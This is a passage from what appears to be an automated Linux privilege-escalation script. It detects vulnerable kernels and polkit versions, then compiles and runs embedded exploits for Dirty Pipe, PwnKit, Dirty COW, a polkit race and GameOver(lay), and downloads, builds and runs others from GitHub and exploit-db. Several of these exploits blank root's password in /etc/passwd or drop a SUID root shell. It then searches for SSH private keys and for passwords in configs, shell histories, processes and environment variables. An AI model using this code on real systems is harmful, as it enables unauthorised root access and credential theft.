  if [ "$kernel_major" -eq 5 ]; then
    local vulnerable=false
    if [ "$kernel_minor" -ge 8 ] && [ "$kernel_minor" -lt 15 ]; then
      vulnerable=true
    elif [ "$kernel_minor" -eq 15 ] && [ "${kernel_patch:-0}" -lt 25 ]; then
      vulnerable=true
    elif [ "$kernel_minor" -eq 16 ] && [ "${kernel_patch:-0}" -lt 11 ]; then
      vulnerable=true
    fi
    if [ "$vulnerable" = true ]; then
      found_vector "CVE-2022-0847 (Dirty Pipe) - Kernel $kernel_version"
      if [ "$AUTO_EXPLOIT" = true ] || [ "$AGGRESSIVE" = true ]; then
        exploit_dirty_pipe
      fi
    else
      info "Not vulnerable (kernel $kernel_version)"
    fi
  elif [ "$kernel_major" -ge 6 ]; then
    info "Kernel 6.x - check specific sub-version"
  else
    info "Not vulnerable (kernel < 5.8)"
  fi
  
  # CVE-2021-4034 (PwnKit / pkexec)
  subheader "CVE-2021-4034 (PwnKit - pkexec)"
  if command_exists pkexec; then
    local pkexec_path=$(command -v pkexec)
    if [ -u "$pkexec_path" ]; then
      # Check if patched by looking at pkexec version
      local pkexec_version=$(pkexec --version 2>/dev/null | grep -oP '[\d.]+')
      found_vector "CVE-2021-4034 (PwnKit) - pkexec is SUID"
      if [ "$AUTO_EXPLOIT" = true ] || [ "$AGGRESSIVE" = true ]; then
        exploit_pwnkit
      fi
    fi
  else
    info "pkexec not found"
  fi
  
  # CVE-2021-3560 (Polkit)
  subheader "CVE-2021-3560 (Polkit)"
  if command_exists pkexec; then
    if systemctl is-active polkit >/dev/null 2>&1 || \
       systemctl is-active polkitd >/dev/null 2>&1; then
      local polkit_version=$(pkaction --version 2>/dev/null | grep -oP '[\d.]+')
      if [ -n "$polkit_version" ]; then
        info "Polkit version: $polkit_version"
        # Vulnerable versions: 0.113 to 0.118
        local pv_major=$(echo "$polkit_version" | cut -d. -f1)
        local pv_minor=$(echo "$polkit_version" | cut -d. -f2)
        if [ "$pv_major" -eq 0 ] && [ "$pv_minor" -ge 113 ] && [ "$pv_minor" -le 118 ]; then
          found_vector "CVE-2021-3560 (Polkit $polkit_version)"
          if [ "$AUTO_EXPLOIT" = true ]; then
            exploit_polkit_cve_2021_3560
          fi
        fi
      fi
    fi
  fi
  
  # CVE-2016-5195 (Dirty COW)
  subheader "CVE-2016-5195 (Dirty COW)"
  if [ "$kernel_major" -lt 4 ] || ([ "$kernel_major" -eq 4 ] && [ "$kernel_minor" -le 8 ]); then
    if [ "$kernel_major" -ge 2 ] && ([ "$kernel_major" -gt 2 ] || [ "$kernel_minor" -ge 6 ]); then
      found_vector "CVE-2016-5195 (Dirty COW) - Kernel $kernel_version potentially vulnerable"
      if [ "$AGGRESSIVE" = true ]; then
        exploit_dirty_cow
      else
        warning "Use --aggressive to auto-exploit (may crash system)"
      fi
    fi
  else
    info "Not vulnerable (kernel >= 4.9)"
  fi
  
  # CVE-2022-2588 (route4 UAF / Dirty Cred) - kernels < 5.19
  subheader "CVE-2022-2588 (Dirty Cred / route4 UAF)"
  local cve_2022_2588_vuln=false
  if [ "$kernel_major" -eq 5 ] && [ "$kernel_minor" -lt 19 ]; then
    cve_2022_2588_vuln=true
  elif [ "$kernel_major" -eq 4 ] && [ "$kernel_minor" -ge 15 ]; then
    cve_2022_2588_vuln=true
  fi
  if [ "$cve_2022_2588_vuln" = true ]; then
    found_vector "CVE-2022-2588 (Dirty Cred) - Kernel $kernel_version"
    if [ "$AGGRESSIVE" = true ]; then
      exploit_cve_2022_2588
    else
      warning "Use --aggressive to auto-exploit CVE-2022-2588 (may crash system)"
    fi
  else
    info "Not vulnerable (kernel $kernel_version)"
  fi
  
  # CVE-2023-0386 (OverlayFS)
  subheader "CVE-2023-0386 (OverlayFS)"
  if [ "$kernel_major" -eq 5 ] || ([ "$kernel_major" -eq 6 ] && [ "$kernel_minor" -lt 2 ]); then
    if grep -q overlay /proc/filesystems 2>/dev/null; then
      warning "OverlayFS available, kernel may be vulnerable to CVE-2023-0386"
    fi
  fi
  
  # CVE-2023-32233 (Netfilter nf_tables)
  subheader "CVE-2023-32233 (Netfilter)"
  if [ "$kernel_major" -eq 5 ] || ([ "$kernel_major" -eq 6 ] && [ "$kernel_minor" -lt 4 ]); then
    if lsmod 2>/dev/null | grep -q nf_tables; then
      found_vector "CVE-2023-32233 (Netfilter nf_tables) - Kernel $kernel_version"
    fi
  fi
  
  # CVE-2024-1086 (Netfilter use-after-free) - kernels 5.14.x - 6.6.x
  subheader "CVE-2024-1086 (Netfilter UAF)"
  local cve_2024_1086_vuln=false
  if [ "$kernel_major" -eq 5 ] && [ "$kernel_minor" -ge 14 ]; then
    cve_2024_1086_vuln=true
  elif [ "$kernel_major" -eq 6 ] && [ "$kernel_minor" -le 6 ]; then
    cve_2024_1086_vuln=true
  fi
  if [ "$cve_2024_1086_vuln" = true ]; then
    if lsmod 2>/dev/null | grep -q nf_tables || [ -f /proc/net/netfilter/nf_tables_api ]; then
      found_vector "CVE-2024-1086 (Netfilter UAF) - Kernel $kernel_version"
      if [ "$AUTO_EXPLOIT" = true ] || [ "$AGGRESSIVE" = true ]; then
        exploit_cve_2024_1086
      fi
    else
      info "nf_tables not loaded, CVE-2024-1086 not applicable"
    fi
  else
    info "Not vulnerable (kernel $kernel_version outside 5.14-6.6 range)"
  fi
  
  # GameOver(lay) CVE-2023-2640 & CVE-2023-32629 (Ubuntu specific)
  subheader "CVE-2023-2640 / CVE-2023-32629 (GameOver(lay))"
  if echo "$SYS_OS" | grep -qi ubuntu; then
    if [ "$kernel_major" -eq 5 ] || [ "$kernel_major" -eq 6 ]; then
      found_vector "Ubuntu kernel - potentially vulnerable to GameOver(lay)"
      if [ "$AUTO_EXPLOIT" = true ]; then
        exploit_attempt "GameOver(lay)"
        unshare -rm sh -c "mkdir l u w m && cp /u*/b*/newgrphelper l/; \
          setcap cap_setuid+eip l/newgrphelper 2>/dev/null; \
          mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && \
          touch m/*; u/newgrphelper" 2>/dev/null
        if check_root_shell; then exploit_success "GameOver(lay)"; return; fi
        exploit_failed "GameOver(lay)"
      fi
    fi
  fi
}

# ============================================================================
# KERNEL EXPLOIT IMPLEMENTATIONS
# ============================================================================
exploit_dirty_pipe() {
  exploit_attempt "CVE-2022-0847 (Dirty Pipe)"
  
  local src="$EXPLOIT_DIR/dirtypipe.c"
  local bin="$EXPLOIT_DIR/dirtypipe"
  
  cat > "$src" << 'DIRTYPIPE_EOF'
/* CVE-2022-0847 Dirty Pipe exploit
 * Overwrites /etc/passwd to add a root user
 */
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2]) {
    if (pipe(p)) abort();
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    unsigned r;
    for (r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    for (r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main() {
    const char *const path = "/etc/passwd";
    printf("[*] Dirty Pipe (CVE-2022-0847)\n");
    printf("[*] Backing up /etc/passwd\n");
    
    /* backup /etc/passwd */
    system("cp /etc/passwd /tmp/passwd.bak");
    
    /* Read original file to find offset of "root:x" */
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    
    struct stat st;
    if (fstat(fd, &st)) {
        perror("stat");
        return 1;
    }
    
    /* Find "root:" in the file */
    char *buf = malloc(st.st_size);
    read(fd, buf, st.st_size);
    
    char *pos = strstr(buf, "root:x:");
    if (!pos) {
        pos = strstr(buf, "root:$");
        if (!pos) {
            printf("[-] Could not find root entry\n");
            free(buf);
            close(fd);
            return 1;
        }
    }
    
    loff_t offset = pos - buf;
    /* We'll overwrite "root:x:" with "root:$1$pwnkit$KkXdO6YF3u.VtPXMXrqJO/:" */
    /* But that changes the line length. Instead overwrite just the 'x' with empty hash field */
    /* Simpler: overwrite ":x:" to ":::" to remove password */
    const char *data = ":::";
    size_t data_size = strlen(data);
    offset += 4; /* skip "root" */
    
    printf("[*] Overwriting at offset %ld\n", (long)offset);
    
    int p[2];
    prepare_pipe(p);
    
    close(fd);
    fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    
    loff_t off = offset / PAGE_SIZE * PAGE_SIZE;
    ssize_t nbytes = splice(fd, &off, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice");
        return 1;
    }
    
    size_t rem_offset = offset % PAGE_SIZE;
    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) {
        perror("write");
        return 1;
    }
    
    printf("[+] /etc/passwd overwritten!\n");
    printf("[+] Run: su root (no password)\n");
    printf("[*] Restore: cp /tmp/passwd.bak /etc/passwd\n");
    
    free(buf);
    close(fd);
    
    /* Try to get shell */
    system("echo '[+] Attempting su root...' && su root -c '/bin/bash'");
    
    return 0;
}
DIRTYPIPE_EOF

  if compile_exploit "$src" "$bin"; then
    success "Dirty Pipe compiled successfully"
    "$bin" 2>/dev/null
    if check_root_shell; then exploit_success "CVE-2022-0847 (Dirty Pipe)"; return; fi
    exploit_failed "CVE-2022-0847 (Dirty Pipe)"
  else
    exploit_failed "CVE-2022-0847 (Dirty Pipe) - compilation failed"
  fi
}

exploit_pwnkit() {
  exploit_attempt "CVE-2021-4034 (PwnKit)"
  
  mkdir -p "$EXPLOIT_DIR/pwnkit_build"
  
  # Create the exploit
  cat > "$EXPLOIT_DIR/pwnkit_build/pwnkit.c" << 'PWNKIT_EOF'
/*
 * CVE-2021-4034 - PwnKit
 * pkexec local privilege escalation
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() __attribute__((constructor));

void gconv() {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    system("id");
    char *args[] = {"/bin/bash", "-p", NULL};
    execve("/bin/bash", args, NULL);
}
PWNKIT_EOF

  cat > "$EXPLOIT_DIR/pwnkit_build/exploit.c" << 'EXPLOIT_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

int main() {
    char *empty_environ[] = { NULL };
    char *empty_argv[] = { NULL };
    
    /* Create GCONV_PATH payload */
    mkdir("GCONV_PATH=.", 0777);
    mkdir("GCONV_PATH=./lol", 0777);
    
    /* Create gconv module */
    FILE *f = fopen("GCONV_PATH=./lol/pwnkit.c", "w");
    if (!f) { perror("fopen"); return 1; }
    fprintf(f, "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n");
    fprintf(f, "void gconv() __attribute__((constructor));\n");
    fprintf(f, "void gconv() {\n");
    fprintf(f, "  setuid(0); setgid(0);\n");
    fprintf(f, "  seteuid(0); setegid(0);\n");
    fprintf(f, "  system(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\");\n");
    fprintf(f, "}\n");
    fclose(f);
    
    system("gcc -shared -fPIC -o 'GCONV_PATH=./lol/pwnkit.so' 'GCONV_PATH=./lol/pwnkit.c' 2>/dev/null");
    
    /* Create gconv-modules */
    f = fopen("GCONV_PATH=./lol/gconv-modules", "w");
    if (!f) return 1;
    fprintf(f, "module UTF-8// PWNKIT// pwnkit 2\n");
    fclose(f);
    
    /* Create charset directory structure */
    mkdir("lol", 0777);
    f = fopen("lol/charset.alias", "w");
    if (!f) return 1;
    fprintf(f, "pwnkit UTF-8\n");
    fclose(f);
    
    /* Trigger pkexec */
    char *args[] = { NULL };
    char *env[] = {
        "lol",
        "PATH=GCONV_PATH=.",
        "CHARSET=pwnkit",
        "SHELL=pwnkit",
        "GIO_USE_VFS=local",
        NULL
    };
    
    printf("[*] Triggering pkexec...\n");
    execve("/usr/bin/pkexec", args, env);
    
    return 0;
}
EXPLOIT_EOF

  if compile_exploit "$EXPLOIT_DIR/pwnkit_build/exploit.c" "$EXPLOIT_DIR/pwnkit_build/exploit"; then
    cd "$EXPLOIT_DIR/pwnkit_build" || return
    ./exploit 2>/dev/null
    cd - >/dev/null || true
    if verify_suid_root /tmp/rootbash; then
      success "PwnKit payload dropped /tmp/rootbash. Running /tmp/rootbash -p"
      /tmp/rootbash -p 2>/dev/null
      if check_root_shell; then exploit_success "CVE-2021-4034 (PwnKit)"; return; fi
    fi
  fi
  
  info "Trying shell-based PwnKit approach..."
  local pwnkit2="$EXPLOIT_DIR/pwnkit2"
  rm -rf "$pwnkit2" 2>/dev/null
  mkdir -p "$pwnkit2" 2>/dev/null
  cd "$pwnkit2" || { exploit_failed "CVE-2021-4034 (PwnKit)"; return; }
  
  if command_exists gcc; then
    cat > evil.c << 'GCONV_PAYLOAD'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init(void) __attribute__((constructor));
void gconv_init(void) {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    if (getuid() == 0) {
        system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash");
        system("id > /tmp/pwnkit_proof.txt");
    }
}
GCONV_PAYLOAD
    
    gcc -shared -fPIC -o evil.so evil.c -nostartfiles 2>/dev/null
    
    if [ -f evil.so ]; then
      mkdir -p "GCONV_PATH=." 2>/dev/null
      ln -sf "$pwnkit2/evil.so" "GCONV_PATH=./evil.so" 2>/dev/null
      
      cat > "GCONV_PATH=./gconv-modules" << 'GMOD'
module  UTF-8//    PWNKIT//    evil    2
GMOD
      
      mkdir -p pwnkit 2>/dev/null
      echo "pwnkit UTF-8//" > pwnkit/charset.alias 2>/dev/null
      
      chmod 755 . "GCONV_PATH=." pwnkit 2>/dev/null
      
      timeout 5 env -i \
        "pwnkit" \
        "PATH=GCONV_PATH=." \
        "CHARSET=pwnkit" \
        "SHELL=pwnkit" \
        "GIO_USE_VFS=local" \
        /usr/bin/pkexec --help >/dev/null 2>&1
      
      sleep 1
      
      if verify_suid_root /tmp/rootbash; then
        cd - >/dev/null || true
        exploit_success "CVE-2021-4034 (PwnKit) - shell method"
        success "Root: /tmp/rootbash -p"
        /tmp/rootbash -p 2>/dev/null
        check_root_shell && return
      fi
      
      if [ -f /tmp/pwnkit_proof.txt ]; then
        local proof_uid
        proof_uid=$(grep -o "uid=[0-9]*" /tmp/pwnkit_proof.txt 2>/dev/null | head -1)
        if echo "$proof_uid" | grep -q "uid=0"; then
          success "PwnKit code executed as uid=0 but SUID bash creation failed"
        else
          info "PwnKit code ran but NOT as root: $proof_uid"
        fi
        cat /tmp/pwnkit_proof.txt
      fi
    fi
  fi
  
  cd - >/dev/null || true
  
  local pkexec_version
  pkexec_version=$(pkexec --version 2>/dev/null | grep -oE "[0-9]+\.[0-9]+")
  if [ -n "$pkexec_version" ]; then
    local pk_major=$(echo "$pkexec_version" | cut -d. -f1)
    local pk_minor=$(echo "$pkexec_version" | cut -d. -f2)
    if [ "$pk_major" -eq 0 ] && [ "$pk_minor" -ge 120 ] 2>/dev/null; then
      info "pkexec version $pkexec_version - likely patched against CVE-2021-4034"
    fi
  fi
  
  exploit_failed "CVE-2021-4034 (PwnKit)"
}

exploit_polkit_cve_2021_3560() {
  exploit_attempt "CVE-2021-3560 (Polkit bypass)"
  
  if ! command_exists dbus-send; then
    exploit_failed "CVE-2021-3560 (Polkit bypass) - dbus-send not found"
    return
  fi
  
  local test_output
  test_output=$(dbus-send --system --dest=org.freedesktop.Accounts \
    --type=method_call --print-reply \
    /org/freedesktop/Accounts \
    org.freedesktop.Accounts.ListCachedUsers 2>&1 || true)
  if echo "$test_output" | grep -q "not provided by any .service files"; then
    exploit_failed "CVE-2021-3560 (Polkit bypass) - AccountsService not available"
    return
  fi
  
  local username="pwnkit$$"
  local password="pwnkit"
  
  info "Trying to create privileged user via polkit race condition..."
  
  for i in $(seq 1 20); do
    dbus-send --system --dest=org.freedesktop.Accounts \
      --type=method_call --print-reply \
      /org/freedesktop/Accounts \
      org.freedesktop.Accounts.CreateUser \
      string:"$username" string:"Pwnkit User" int32:1 2>/dev/null &
    
    local pid=$!
    sleep 0.008
    kill "$pid" 2>/dev/null
    wait "$pid" 2>/dev/null
    
    if id "$username" >/dev/null 2>&1; then
      success "User $username created!"
      
      local hash=$(openssl passwd -5 "$password" 2>/dev/null)
      for j in $(seq 1 20); do
        dbus-send --system --dest=org.freedesktop.Accounts \
          --type=method_call --print-reply \
          /org/freedesktop/Accounts/User$(id -u "$username" 2>/dev/null) \
          org.freedesktop.Accounts.User.SetPassword \
          string:"$hash" string:"pwnkit" 2>/dev/null &
        
        local pid2=$!
        sleep 0.008
        kill "$pid2" 2>/dev/null
        wait "$pid2" 2>/dev/null
      done
      
      exploit_success "CVE-2021-3560 (Polkit bypass)"
      success "Try: su $username (password: $password)"
      return
    fi
  done
  
  exploit_failed "CVE-2021-3560 (Polkit bypass)"
}

exploit_dirty_cow() {
  exploit_attempt "CVE-2016-5195 (Dirty COW)"
  warning "This exploit may crash the system!"
  
  local src="$EXPLOIT_DIR/dirtycow.c"
  local bin="$EXPLOIT_DIR/dirtycow"
  
  # Download from exploitdb
  download_file "https://www.exploit-db.com/download/40839" "$src" 2>/dev/null
  
  if [ ! -s "$src" ]; then
    # Fallback: use cowroot (simpler variant)
    cat > "$src" << 'COWEOF'
/*
 * CVE-2016-5195 (Dirty COW) - /etc/passwd variant
 * Creates a root user by exploiting copy-on-write
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1, pth2, pth3;

// This replaces "root:x:" with "root:::" in /etc/passwd
char *payload = "root:::0:0:root:/root:/bin/bash\n";

void *madviseThread(void *arg) {
    while(!stop) {
        madvise(map, 100, MADV_DONTNEED);
        usleep(1);
    }
    return NULL;
}

void *writerThread(void *arg) {
    char *str = payload;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 10000000 && !stop; i++) {
        lseek(f, (uintptr_t)map, SEEK_SET);
        c += write(f, str, strlen(str));
        usleep(1);
    }
    printf("[*] Wrote %d bytes\n", c);
    stop = 1;
    return NULL;
}

void *checkThread(void *arg) {
    while(!stop) {
        char buf[256];
        FILE *fp = fopen("/etc/passwd", "r");
        if (fp) {
            if (fgets(buf, sizeof(buf), fp)) {
                if (strstr(buf, "root:::")) {
                    printf("[+] Success! /etc/passwd modified!\n");
                    stop = 1;
                }
            }
            fclose(fp);
        }
        usleep(100000);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    printf("[*] Dirty COW (CVE-2016-5195)\n");
    printf("[*] Modifying /etc/passwd...\n");
    printf("[*] Backup: cp /etc/passwd /tmp/passwd.bak\n");
    system("cp /etc/passwd /tmp/passwd.bak");
    
    f = open("/etc/passwd", O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    
    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, writerThread, NULL);
    pthread_create(&pth3, NULL, checkThread, NULL);
    
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    pthread_join(pth3, NULL);
    
    printf("[+] Run: su root (no password)\n");
    printf("[*] Restore: cp /tmp/passwd.bak /etc/passwd\n");
    
    return 0;
}
COWEOF
  fi
  
  if compile_exploit "$src" "$bin"; then
    success "Dirty COW compiled"
    "$bin" 2>/dev/null
    sleep 5
    if check_root_shell; then exploit_success "CVE-2016-5195 (Dirty COW)"; return; fi
    exploit_failed "CVE-2016-5195 (Dirty COW)"
  else
    exploit_failed "CVE-2016-5195 (Dirty COW) - compilation failed"
  fi
}

exploit_cve_2024_1086() {
  exploit_attempt "CVE-2024-1086 (Netfilter UAF)"
  
  if ! command_exists gcc; then
    warning "gcc not found - cannot compile CVE-2024-1086 exploit"
    info "Manual: git clone https://github.com/Notselwyn/CVE-2024-1086 && cd CVE-2024-1086 && make"
    exploit_failed "CVE-2024-1086 (no compiler)"
    return
  fi
  
  local exploit_dir="$EXPLOIT_DIR/cve_2024_1086"
  mkdir -p "$exploit_dir" 2>/dev/null
  
  info "Downloading CVE-2024-1086 exploit from GitHub..."
  local archive="$exploit_dir/exploit.tar.gz"
  download_file "https://github.com/Notselwyn/CVE-2024-1086/archive/refs/tags/v1.0.0.tar.gz" "$archive"
  
  if [ ! -f "$archive" ]; then
    download_file "https://github.com/Notselwyn/CVE-2024-1086/archive/refs/heads/main.tar.gz" "$archive"
  fi
  
  if [ -f "$archive" ]; then
    cd "$exploit_dir" || { exploit_failed "CVE-2024-1086 (cd failed)"; return; }
    tar xzf "$archive" 2>/dev/null
    
    local src_dir=""
    for d in CVE-2024-1086-*/  CVE-2024-1086-main/; do
      if [ -d "$d" ] 2>/dev/null; then
        src_dir="$d"
        break
      fi
    done
    
    if [ -n "$src_dir" ] && [ -d "$src_dir" ]; then
      cd "$src_dir" || { exploit_failed "CVE-2024-1086 (cd src failed)"; return; }
      
      if [ -f "Makefile" ]; then
        info "Compiling CVE-2024-1086..."
        make 2>/dev/null
        
        local exploit_bin=""
        for candidate in exploit a.out cve-2024-1086; do
          if [ -x "$candidate" ]; then
            exploit_bin="$candidate"
            break
          fi
        done
        
        if [ -z "$exploit_bin" ]; then
          for candidate in src/*.c *.c; do
            if [ -f "$candidate" ] 2>/dev/null; then
              gcc -o "$exploit_dir/netfilter_uaf" "$candidate" -lmnl -lnftnl -lpthread 2>/dev/null || \
              gcc -o "$exploit_dir/netfilter_uaf" "$candidate" -lpthread 2>/dev/null
              if [ -x "$exploit_dir/netfilter_uaf" ]; then
                exploit_bin="$exploit_dir/netfilter_uaf"
              fi
              break
            fi
          done
        fi
        
        if [ -n "$exploit_bin" ] && [ -x "$exploit_bin" ]; then
          success "CVE-2024-1086 compiled, executing..."
          warning "This may take 30-60 seconds..."
          timeout 120 "$exploit_bin" 2>/dev/null
          
          if verify_suid_root /tmp/rootbash; then
            exploit_success "CVE-2024-1086 (Netfilter UAF) -> SUID bash"
            /tmp/rootbash -p 2>/dev/null
            check_root_shell && { cd - >/dev/null; return; }
          fi
          
          if check_root_shell; then
            exploit_success "CVE-2024-1086 (Netfilter UAF)"
            cd - >/dev/null; return
          fi
        else
          warning "CVE-2024-1086 compilation failed (may need libmnl-dev/libnftnl-dev)"
          info "Install deps: apt install libmnl-dev libnftnl-dev OR yum install libmnl-devel libnftnl-devel"
        fi
      fi
    fi
    cd - >/dev/null 2>/dev/null || true
  else
    warning "Failed to download CVE-2024-1086 exploit"
    info "Manual download: https://github.com/Notselwyn/CVE-2024-1086"
  fi
  
  exploit_failed "CVE-2024-1086 (Netfilter UAF)"
}

exploit_cve_2022_2588() {
  exploit_attempt "CVE-2022-2588 (route4 UAF / Dirty Cred)"
  warning "This exploit may crash the system!"
  
  if ! command_exists gcc; then
    warning "gcc not found - cannot compile CVE-2022-2588 exploit"
    exploit_failed "CVE-2022-2588 (no compiler)"
    return
  fi
  
  local exploit_dir="$EXPLOIT_DIR/cve_2022_2588"
  mkdir -p "$exploit_dir" 2>/dev/null
  
  info "Downloading CVE-2022-2588 exploit..."
  local archive="$exploit_dir/exploit.tar.gz"
  download_file "https://github.com/Markakd/CVE-2022-2588/archive/refs/heads/master.tar.gz" "$archive"
  
  if [ -f "$archive" ]; then
    cd "$exploit_dir" || { exploit_failed "CVE-2022-2588 (cd failed)"; return; }
    tar xzf "$archive" 2>/dev/null
    
    local src_dir=""
    for d in CVE-2022-2588-*/; do
      if [ -d "$d" ] 2>/dev/null; then
        src_dir="$d"
        break
      fi
    done
    
    if [ -n "$src_dir" ] && [ -d "$src_dir" ]; then
      cd "$src_dir" || { exploit_failed "CVE-2022-2588 (cd src failed)"; return; }
      
      if [ -f "Makefile" ]; then
        make 2>/dev/null
      fi
      
      local exploit_bin=""
      for candidate in exp exploit a.out; do
        if [ -x "$candidate" ]; then
          exploit_bin="$candidate"
          break
        fi
      done
      
      if [ -z "$exploit_bin" ]; then
        for candidate in *.c exp*.c; do
          if [ -f "$candidate" ] 2>/dev/null; then
            gcc -o "$exploit_dir/dirtycred" "$candidate" -lpthread 2>/dev/null
            if [ -x "$exploit_dir/dirtycred" ]; then
              exploit_bin="$exploit_dir/dirtycred"
            fi
            break
          fi
        done
      fi
      
      if [ -n "$exploit_bin" ] && [ -x "$exploit_bin" ]; then
        success "CVE-2022-2588 compiled, executing..."
        warning "System may become unstable..."
        
        cp /etc/passwd "$TMPDIR/passwd.bak" 2>/dev/null
        
        timeout 60 "$exploit_bin" 2>/dev/null
        
        if verify_suid_root /tmp/rootbash; then
          exploit_success "CVE-2022-2588 (Dirty Cred) -> SUID bash"
          /tmp/rootbash -p 2>/dev/null
          check_root_shell && { cd - >/dev/null; return; }
        fi
        
        if check_root_shell; then
          exploit_success "CVE-2022-2588 (Dirty Cred)"
          cd - >/dev/null; return
        fi
      else
        warning "CVE-2022-2588 compilation failed"
      fi
    fi
    cd - >/dev/null 2>/dev/null || true
  else
    warning "Failed to download CVE-2022-2588 exploit"
    info "Manual: https://github.com/Markakd/CVE-2022-2588"
  fi
  
  exploit_failed "CVE-2022-2588 (route4 UAF)"
}

# ============================================================================
# 8. NFS CHECKS
# ============================================================================
check_nfs() {
  header "NFS SHARES"
  
  if [ -f /etc/exports ]; then
    info "NFS exports:"
    cat /etc/exports 2>/dev/null
    
    if grep -q "no_root_squash" /etc/exports 2>/dev/null; then
      found_vector "NFS share with no_root_squash"
      grep "no_root_squash" /etc/exports
    fi
    
    if grep -q "no_all_squash" /etc/exports 2>/dev/null; then
      warning "NFS share with no_all_squash"
    fi
  else
    info "No NFS exports found"
  fi
  
  # Check mounted NFS shares
  mount 2>/dev/null | grep nfs | while IFS= read -r line; do
    warning "NFS mount: $line"
  done
}

# ============================================================================
# 9. PASSWORD & CREDENTIAL HUNTING
# ============================================================================
check_passwords() {
  header "PASSWORD & CREDENTIAL HUNTING"
  
  subheader "SSH keys"
  # Find readable SSH private keys
  timeout 10 find / -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -not -path "/nix/*" -not -path "/snap/*" -not -path "/run/*" -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while IFS= read -r key; do
    if [ -r "$key" ]; then
      found_vector "Readable SSH private key: $key"
      local owner=$(stat -c '%U' "$key" 2>/dev/null)
      info "Owner: $owner"
      head -2 "$key"
      echo "  ..."
    fi
  done
  
  # Check for SSH keys in home directories
  find /home /root -name "authorized_keys" -readable 2>/dev/null | while IFS= read -r f; do
    info "Authorized keys: $f"
  done
  
  subheader "Configuration files with passwords"
  # Common config files with credentials
  local config_files="/etc/mysql/my.cnf /etc/mysql/debian.cnf /var/www/html/wp-config.php \
    /var/www/html/configuration.php /var/www/html/config.php /var/www/html/.env \
    /var/www/.env /opt/*/.env /srv/*/.env /etc/tomcat*/tomcat-users.xml \
    /etc/openvpn/*.conf /etc/ppp/chap-secrets /etc/ppp/pap-secrets \
    /etc/inetd.conf /etc/ftpusers /etc/ftp.conf"
  
  for f in $config_files; do
    if [ -r "$f" ] 2>/dev/null; then
      if grep -qiE "(password|passwd|pass|pwd|secret|key|token|credential)" "$f" 2>/dev/null; then
        found_vector "Credentials found in: $f"
        grep -iE "(password|passwd|pass|pwd|secret|key|token|credential)" "$f" 2>/dev/null | head -5
      fi
    fi
  done
  
  subheader "History files"
  for histfile in /home/*/.bash_history /root/.bash_history /home/*/.zsh_history \
    /root/.zsh_history /home/*/.mysql_history /root/.mysql_history \
    /home/*/.psql_history /root/.psql_history; do
    if [ -r "$histfile" ] 2>/dev/null; then
      local creds=$(grep -iE "(password|passwd|pass=|pwd|secret|token|mysql.*-p|ssh.*@|sshpass)" "$histfile" 2>/dev/null | head -10)
      if [ -n "$creds" ]; then
        found_vector "Credentials in history: $histfile"
        echo "$creds"
      fi
    fi
  done
  
  subheader "Process credentials"
  ps auxwww 2>/dev/null | grep -iE "(password|passwd|pass=|pwd|secret|token)" | grep -v grep | while IFS= read -r line; do
    found_vector "Credentials in process: $line"
  done
  
  subheader "Environment variables"
  env 2>/dev/null | grep -iE "(password|passwd|pass=|db_pass|secret|api_key|token)" | grep -vE "^(PWD|OLDPWD|PATH|SHELL|TERM|LANG|HOME|USER|LOGNAME|HOSTNAME|SHLVL|_)=" | while IFS= read -r line; do
    found_vector "Credential in environment: $line"
  done
  
  # Database credentials
  subheader "Database credentials"
  for f in $(find /var/www /opt /srv /home -name "*.php" -o -name "*.py" -o -name "*.rb" \
    -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" -o -name "*.yml" \
    -o -name "*.yaml" -o -name "*.xml" -o -name "*.json" 2>/dev/null | head -100); do
    if grep -lqiE "(db_pass|db_password|database_password|mysql_pwd|POSTGRES_PASSWORD|MONGO_URI)" "$f" 2>/dev/null; then
      found_vector "Database credentials in: $f"
      grep -iE "(db_pass|db_password|database_password|mysql_pwd|POSTGRES_PASSWORD|MONGO_URI)" "$f" 2>/dev/null | head -3
    fi
  done
}

# ============================================================================
# 10. NETWORK & SERVICES
# ============================================================================
check_network() {
  header "NETWORK & SERVICES"
  
  subheader "Listening services"
  if command_exists ss; then
    ss -tlnp 2>/dev/null | while IFS= read -r line; do
      info "$line"
    done
  elif command_exists netstat; then
    netstat -tlnp 2>/dev/null | while IFS= read -r line; do
      info "$line"
    done
  fi
  
  subheader "Services running as root"
